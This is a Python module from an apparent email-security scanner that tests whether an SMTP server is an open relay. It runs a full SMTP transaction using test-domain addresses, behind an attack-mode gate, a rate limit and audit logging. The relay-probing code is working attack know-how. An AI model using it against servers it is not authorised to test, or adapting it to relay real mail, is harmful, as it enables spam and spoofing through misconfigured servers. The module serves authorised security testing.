"""
Open relay exploitation PoC — ATTACK MODE only.
Proves external->external relay is possible using RFC 2606 test domains only.
No real recipients; no delivery tracking; no abuse.
"""
import logging
from core.context import ScanContext
from core.utils import safe_socket_connect, read_line, get_smtp_host
from core.attack_mode import (
    require_attack_mode,
    enforce_rate_limit,
    get_test_from_domain,
    get_test_to_domain,
)
from core.constants import SMTP_PORT, SMTP_EXPLOIT_TIMEOUT, EHLO_IDENTITY

logger = logging.getLogger("mailt.smtp.exploit")


def _send(sock, cmd: str) -> None:
    sock.sendall((cmd + "\r\n").encode("utf-8"))


def _send_data_phase(sock, from_addr: str, to_addr: str, timeout: float) -> tuple[bool, str | None]:
    """
    Send DATA with minimal RFC-compliant message. Returns (success, last_response).
    Success = server returns 250 and response contains Accepted/Queued/delivery.
    """
    _send(sock, "DATA")
    line = read_line(sock, timeout)
    if not line or not line.startswith("354"):
        return (False, line)
    # Minimal RFC message — no real content, PoC only. End DATA with line containing only "."
    body = (
        "Subject: MailT PoC - Open Relay Test\r\n"
        "From: " + from_addr + "\r\n"
        "To: " + to_addr + "\r\n"
        "Date: Mon, 1 Jan 2020 00:00:00 +0000\r\n"
        "\r\n"
        "[MailT PoC] This is a controlled proof-of-concept. No abuse. RFC test domain.\r\n"
    )
    sock.sendall((body + ".\r\n").encode("utf-8"))
    data_resp = read_line(sock, timeout)
    return (bool(data_resp and data_resp.startswith("250") and ("Accepted" in data_resp or "Queued" in data_resp or "delivery" in data_resp.lower() or "ok" in data_resp.lower())), data_resp)


def run(ctx: ScanContext) -> None:
    if not require_attack_mode(ctx):
        return
    enforce_rate_limit("open_relay_exploit")
    mx_host = get_smtp_host(ctx)
    from_domain = get_test_from_domain()
    to_domain = get_test_to_domain()
    from_addr = f"mailt-poc@{from_domain}"
    to_addr = f"mailt-poc@{to_domain}"

    result = {
        "exploit_attempted": True,
        "exploit_success": False,
        "proof_of_execution": None,
        "mail_from_code": None,
        "rcpt_to_code": None,
        "data_code": None,
        "error": None,
    }
    sock = safe_socket_connect(mx_host, SMTP_PORT, SMTP_EXPLOIT_TIMEOUT)
    if not sock:
        result["error"] = "connection_failed"
        ctx.add_smtp_data("open_relay_exploit", result)
        ctx.log_exploit_audit("open_relay_exploit", "relay_poc", "connection_failed", result)
        return
    try:
        read_line(sock, SMTP_EXPLOIT_TIMEOUT)
        _send(sock, f"EHLO {EHLO_IDENTITY}")
        while True:
            line = read_line(sock, SMTP_EXPLOIT_TIMEOUT)
            if not line or (len(line) >= 3 and line[3:4] != "-" and line[:3] == "250"):
                break
        _send(sock, f"MAIL FROM:<{from_addr}>")
        line = read_line(sock, SMTP_EXPLOIT_TIMEOUT)
        result["mail_from_code"] = line[:3] if line else None
        if not line or not line.startswith("250"):
            result["proof_of_execution"] = line
            ctx.log_exploit_audit("open_relay_exploit", "relay_poc", "mail_from_rejected", {"code": result["mail_from_code"]})
            ctx.add_smtp_data("open_relay_exploit", result)
            return
        _send(sock, f"RCPT TO:<{to_addr}>")
        line = read_line(sock, SMTP_EXPLOIT_TIMEOUT)
        result["rcpt_to_code"] = line[:3] if line else None
        if not line or not line.startswith("250"):
            result["proof_of_execution"] = line
            ctx.log_exploit_audit("open_relay_exploit", "relay_poc", "rcpt_to_rejected", {"code": result["rcpt_to_code"]})
            ctx.add_smtp_data("open_relay_exploit", result)
            return
        success, data_resp = _send_data_phase(sock, from_addr, to_addr, SMTP_EXPLOIT_TIMEOUT)
        result["data_code"] = data_resp[:3] if data_resp else None
        result["proof_of_execution"] = data_resp
        result["exploit_success"] = success
        _send(sock, "QUIT")
        ctx.log_exploit_audit("open_relay_exploit", "relay_poc", "success" if success else "data_rejected", result)
    except Exception as e:
        result["error"] = str(e)
        ctx.log_exploit_audit("open_relay_exploit", "relay_poc", "error", {"error": str(e)})
    finally:
        try:
            sock.close()
        except OSError:
            pass
    ctx.add_smtp_data("open_relay_exploit", result)
    if ctx.verbose:
        logger.debug("Open relay exploit: success=%s proof=%s", result.get("exploit_success"), result.get("proof_of_execution"))
